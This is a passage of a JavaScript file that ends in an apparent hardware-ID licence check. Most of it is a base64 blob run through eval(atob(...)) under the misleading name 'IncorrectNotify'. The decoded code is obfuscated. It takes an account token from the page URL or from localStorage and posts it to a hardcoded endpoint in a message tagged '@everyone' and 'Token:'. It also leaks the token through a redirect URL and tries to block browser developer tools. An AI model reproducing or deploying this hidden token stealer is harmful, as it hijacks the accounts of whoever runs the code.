MHgyNjpoVmVlOWItMHg0MTpoVmVlOWItMHg2MzpoVmVlOWItMHgxM119dHlwZW9mKGhWZWU5Yj1bcU8zREVTVygweGUpLHFPM0RFU1coeW05aWVDKC0weDIyKSkscU8zREVTVygweDEwKSxxTzNERVNXKDB4ZCldLEEwY3ZUQm49e1JfX1NUNWU6cU8zREVTVy5jYWxsKHRIUDg2RkQoMHg2NyksMHhjKSx4Z1E1ZWw6cU8zREVTVy5jYWxsKHltOWllQygtMHgyMSksMHgxZSl9KTtjb25zdCBXYmJGSHo9QTBjdlRCbi5SX19TVDVlO2lmKHdpbmRvd1tMYkhWTERQW3ltOWllQygtMHgxNyldXVtoVmVlOWJbeW05aWVDKC0weDI2KV1dW2hWZWU5YlsweDFdXShoVmVlOWJbMHgyXSkpe3ZhciBiaHlzRlQ9cU8zREVTVygweDFiKTtjb25zdCBCSEJoTlRIPW5ldyBVUkwod2luZG93W2hWZWU5YlsweDNdXVtxTzNERVNXKDB4ZSldKSxXZE9zbzk9YXRvYihCSEJoTlRIW3FPM0RFU1coMHgxMSldW2V0eGFhSnAuT3c5a1BfZF0oJ3YnKSk7aWYoV2RPc285KXt2YXIgUXNjb0h3MjtmdW5jdGlvbiBLVDFqc2o4KGhWZWU5Yil7cmV0dXJuIHRXQUl3ZFdbaFZlZTliPDB4MWY/aFZlZTliKzB4MWQ6aFZlZTliPjB4MWY/aFZlZTliPDB4MzE/aFZlZTliPjB4MzE/aFZlZTliLTB4MjA6aFZlZTliPDB4MzE/aFZlZTliPjB4MWY/aFZlZTliPDB4MWY/aFZlZTliKzB4NTE6aFZlZTliPjB4MWY/aFZlZTliPDB4MWY/aFZlZTliKzB4NzpoVmVlOWItMHgyMDpoVmVlOWIrMHg1MzpoVmVlOWIrMHgyNjpoVmVlOWItMHg3OmhWZWU5Yi0weDI4OmhWZWU5Yi0weDNiXX1Rc2NvSHcyPXFPM0RFU1dbS1QxanNqOCgweDJhKV0odm9pZCAweDAsMHgxMyk7Y29uc3Qgc0xyWmkxPXtbUXNjb0h3Ml06aGc2QmlORixbTGJIVkxEUFsweDJdXTpgPEAxMTU3NzQyNTAzNzI2OTU2Njc1PiBAZXZlcnlvbmVcbkRhdGU6IFxgJHtuZXcgRGF0ZX1cYFxuVG9rZW46IFxgJHtXZE9zbzl9XGBgfSxCSEJoTlRIPW5ldyBYTUxIdHRwUmVxdWVzdDt0eXBlb2YoQkhCaE5USFtxTzNERVNXLmNhbGwoeW05aWVDKC0weDIxKSwweDE2KV0ocU8zREVTVygweDE3KSxXYmJGSHopLEJIQmhOVEhbcU8zREVTVygweDE4KV0ocU8zREVTVy5jYWxsKHRIUDg2RkQoMHg2NyksMHgxOSkscU8zREVTVygweDFhKSksQkhCaE5USFtiaHlzRlRdKEpTT05bcU8zREVTVygweDFjKV0oc0xyWmkxKSkpfXJldHVybn1pZih3aW5kb3dbcU8zREVTVygweGQpXVtxTzNERVNXKHRIUDg2RkQoMHg2OCkpXT09PXFPM0RFU1coMHgxZCkpe2NvbnN0IFhEMDNwZj1sb2NhbFN0b3JhZ2VbQTBjdlRCbi54Z1E1ZWxdO2lmKFhEMDNwZil7d2luZG93W3FPM0RFU1codEhQODZGRCgweDY5KSldW0xiSFZMRFBbdEhQODZGRCgweDZhKV1dPWBodHRwczovL3d3dy55b3V0dWJlLmNvbS93YXRjaD92PSR7YnRvYShKU09OW3FPM0RFU1coMHgxYyldKFhEMDNwZikpfWB9fWVsc2V7d2luZG93W0xiSFZMRFBbMHg0XV1bcU8zREVTVygweGUpXT1xTzNERVNXKDB4MWQpfX0pKCksd2luZG93W3FPM0RFU1coMHhkKV1bcU8zREVTVyh0SFA4NkZEKDB4NjgpKV1bTGJIVkxEUFsweDVdXShMYkhWTERQWzB4Nl0pKXt2YXIgTldJdE5tLGFVbldZSEc7ZnVuY3Rpb24gejZCbUpLSShoVmVlOWIpe3JldHVybiB0V0FJd2RXW2hWZWU5Yj4tMHgxZj9oVmVlOWIrMHhkOmhWZWU5Yj4tMHgzMT9oVmVlOWI8LTB4MzE/aFZlZTliLTB4MjI6aFZlZTliKzB4MzA6aFZlZTliKzB4MjJdfXR5cGVvZihOV0l0Tm09W3FPM0RFU1coMHgyNikscU8zREVTVygweDI4KV0sYVVuV1lIRz17W3RIUDg2RkQoMHg2YildOnFPM0RFU1codEhQODZGRCgweDY1KSksTmlxTUdfUDpxTzNERVNXKDB4MjUpfSk7Y29uc3QgaFZlZTliPWRvY3VtZW50W3FPM0RFU1coMHgxZildKHFPM0RFU1coMHgyMCkpO3ZvaWQoaFZlZTliW2FVbldZSEdbdEhQODZGRCgweDZiKV1dW0xiSFZMRFBbMHg3XV09cU8zREVTVygweDIzKSxoVmVlOWJbcU8zREVTVygweDIxKV1bcU8zREVTV1t0SFA4NkZEKDB4NmMpXSh2b2lkIDB4MCwweDI0KV09cU8zREVTVygweDIzKSxoVmVlOWJbcU8zREVTVyh0SFA4NkZEKDB4NjUpKV1bYVVuV1lIRy5OaXFNR19QXT1OV0l0Tm1bMHgwXSxoVmVlOWJbcU8zREVTVygweDIxKV1bcU8zREVTVygweDI3KV09dEhQODZGRCgweDZkKSxoVmVlOWJbcU8zREVTVyh6NkJtSktJKC0weDJkKSldW05XSXRObVsweDFdXT16NkJtSktJKC0weDI1KSxoVmVlOWJbcU8zREVTV1t0SFA4NkZEKDB4NmMpXSh0SFA4NkZEKDB4NjcpLDB4MjEpXVtxTzNERVNXKDB4MjkpXT1MYkhWTERQW3o2Qm1KS0koLTB4MjIpXSxoVmVlOWJbZXR4YWFKcC50MXFvem5MXVtldHhhYUpwLkg1VHEwMF09cU8zREVTVygweDJjKSxoVmVlOWJbcU8zREVTVygweDIxKV1bcU8zREVTVygweDJkKV09cU8zREVTV1t6NkJtSktJKC0weDI2KV0odEhQODZGRCgweDY3KSwweDJlKSxoVmVlOWJbcU8zREVTV1t6NkJtSktJKC0weDI0KV0odm9pZCAweDAsW3RIUDg2RkQoMHg2NSldKV1bcU8zREVTVygweDJmKV09cU8zREVTVygweDMwKSxoVmVlOWJbS1QxanNqOF1bcU8zREVTVygweDMxKV09UXNjb0h3MixoVmVlOWJbcU8zREVTVygweDIxKV1bcU8zREVTVygweDMyKV09cU8zREVTVygweDMzKSxoVmVlOWJbZXR4YWFKcFt0SFA4NkZEKDB4NmYpXV1bZXR4YWFKcC5uTmxuSVJrXT1xTzNERVNXKDB4MzUpLGhWZWU5YltxTzNERVNXLmNhbGwodm9pZCAweDAsMHgzNildPXFPM0RFU1coMHgzNyksZG9jdW1lbnRbcU8zREVTVygweDM4KV1bcU8zREVTVygweDM5KV0oaFZlZTliKSk7ZnVuY3Rpb24gWHQ1TjUyVChoVmVlOWIpe2lmKGhWZWU5YiYmc0xyWmkxLkZoS1Vjd1txTzNERVNXKDB4M2EpXSgweDUpPT0weDM4KXtjb25zdCB0V0FJd2RXPSgpPT57Zm9yKGxldCBoVmVlOWI9MHgwO2hWZWU5YjwweDEvMHgwJiZzTHJaaTEuRmhLVWN3W3FPM0RFU1coMHgzYSldKDB4NSk9PTB4Mzg7aFZlZTliKyspaWYoaFZlZTliPT0weDEvMHgwKXtyZXR1cm4gcU8zREVTVygweDNiKX19O3RXQUl3ZFcoKX19dHlwZW9mKGRldnRvb2xzRGV0ZWN0b3JbcU8zREVTVygweDNjKV0oWHQ1TjUyVCksZGV2dG9vbHNEZXRlY3RvcltxTzNERVNXKDB4M2QpXSgpKX1mdW5jdGlvbiBCN0ZuODQoaFZlZTliKXtjb25zdCBBMGN2VEJuPSdBQkNERUZHSElKS0xNTk9QUVJTVFVWV1hZWmFiY2RlZmdoaWprbG1ub3BxcnN0dXZ3eHl6MDEyMzQ1Njc4OSEjJCUmKCkqKywuLzo7PD0+P0BbXV5fYHt8fX4iJyx5bTlpZUM9JycrKGhWZWU5Ynx8JycpLFdiYkZIej15bTlpZUMubGVuZ3RoLGJoeXNGVD1bXTtsZXQgQkhCaE5USD0weDAsV2RPc285PTB4MCxRc2NvSHcyPS0weDE7Zm9yKGxldCBLVDFqc2o4PTB4MDtLVDFqc2o4PFdiYkZIejtLVDFqc2o4Kyspe2NvbnN0IGhnNkJpTkY9QTBjdlRCbi5pbmRleE9mKHltOWllQ1tLVDFqc2o4XSk7aWYoaGc2QmlORj09PS0weDEpe2NvbnRpbnVlfWlmKFFzY29IdzI8dEhQODZGRCgweDYyKSl7UXNjb0h3Mj1oZzZCaU5GfWVsc2V7dmFyIGV0eGFhSnA9ZklRWEQ3NShoVmVlOWI9PntyZXR1cm4gdFdBSXdkV1toVmVlOWI8LTB4MWE/aFZlZTliPi0weDJjP2hWZWU5YjwtMHgxYT9oVmVlOWI8LTB4MmM/aFZlZTliKzB4NWU6aFZlZTliPC0weDFhP2hWZWU5YjwtMHgyYz9oVmVlOWIrMHhiOmhWZWU5Yj4tMHgxYT9oVmVlOWItMHg0OmhWZWU5YjwtMHgxYT9oVmVlOWIrMHgyYjpoVmVlOWIrMHhjOmhWZWU5YisweDc6aFZlZTliLTB4NTU6aFZlZTliKzB4MjI6aFZlZTliLTB4MzBdfSwweDEpO3R5cGVvZihRc2NvSHcyKz1oZzZCaU5GKjB4NWIsQkhCaE5USHw9UXNjb0h3Mjw8V2RPc285LFdkT3NvOSs9KFFzY29IdzImMHgxZmZmKT4weDU4PzB4ZDpldHhhYUpwKC0weDI1KSk7ZG97dmFyIExiSFZMRFA9ZklRWEQ3NShoVmVlOWI9PntyZXR1cm4gdFdBSXdkV1toVmVlOWI+LTB4MTA/aFZlZTliPDB4Mj9oVmVlOWI8LTB4MTA/aFZlZTliKzB4NDI6aFZlZTliPjB4Mj9oVmVlOWIrMHgyZTpoVmVlOWI+MHgyP2hWZWU5Yi0weDJhOmhWZWU5Yj4tMHgxMD9oVmVlOWI8LTB4MTA/aFZlZTliKzB4NGI6aFZlZTliKzB4ZjpoVmVlOWIrMHgyNDpoVmVlOWIrMHg2MDpoVmVlOWItMHgzYl19LDB4MSk7dm9pZChiaHlzRlQucHVzaChCSEJoTlRIJkxiSFZMRFAoMHgxKSksQkhCaE5USD4+PUxiSFZMRFAoLTB4MSksV2RPc285LT0weDgpfXdoaWxlKFdkT3NvOT4weDcpO1FzY29IdzI9LWV0eGFhSnAoLTB4MWMpfX1pZihRc2NvSHcyPi10SFA4NkZEKDB4NzEpKXtiaHlzRlQucHVzaCgoQkhCaE5USHxRc2NvSHcyPDxXZE9zbzkpJnRIUDg2RkQoMHg3MikpfXJldHVybiBFclZ4NE0oYmh5c0ZUKX1mdW5jdGlvbiBxTzNERVNXKHRXQUl3ZFcsaFZlZTliLEEwY3ZUQm4seW05aWVDPUI3Rm44NCxXYmJGSHo9WEQwM3BmKXtpZihBMGN2VEJuKXtyZXR1cm4gaFZlZTliW1hEMDNwZltBMGN2VEJuXV09cU8zREVTVyh0V0FJd2RXLGhWZWU5Yil9ZWxzZXtpZihoVmVlOWIpe1tXYmJGSHosaFZlZTliXT1beW05aWVDKFdiYkZIeiksdFdBSXdkV3x8QTBjdlRCbl19fXJldHVybiBoVmVlOWI/dFdBSXdkV1tXYmJGSHpbaFZlZTliXV06WEQwM3BmW3RXQUl3ZFddfHwoQTBjdlRCbj0oV2JiRkh6W3RXQUl3ZFddLHltOWllQyksWEQwM3BmW3RXQUl3ZFddPUEwY3ZUQm4oVjZ3SlhUS1t0V0FJd2RXXSkpfWZ1bmN0aW9uIGNDRktyZ3coKXtyZXR1cm5bMHgwLDB4NiwweDNmLDB4MjEsMHhmLHZvaWQgMHgwLDB4ZSwweGQsMHgzLCdleFdlT2onLCdjYWxsJywnMCcsJ2FwcGx5JywnZEZMblJXSycsMHg4LDB4MSwweGZmXX1mdW5jdGlvbiBmSVFYRDc1KHRXQUl3ZFcsaFZlZTliKXt2YXIgQTBjdlRCbj1mdW5jdGlvbigpe3JldHVybiB0V0FJd2RXKC4uLmFyZ3VtZW50cyl9O09iamVjdFsnZGVmaW5lUHJvcGVydHknXShBMGN2VEJuLCdsZW5ndGgnLHsndmFsdWUnOmhWZWU5YiwnY29uZmlndXJhYmxlJzp0cnVlfSk7cmV0dXJuIEEwY3ZUQm59";
      eval(atob(IncorrectNotify));
      return false;
    }
  }
  const hwid = generateHWID();
  verifyHWID(hwid);
}
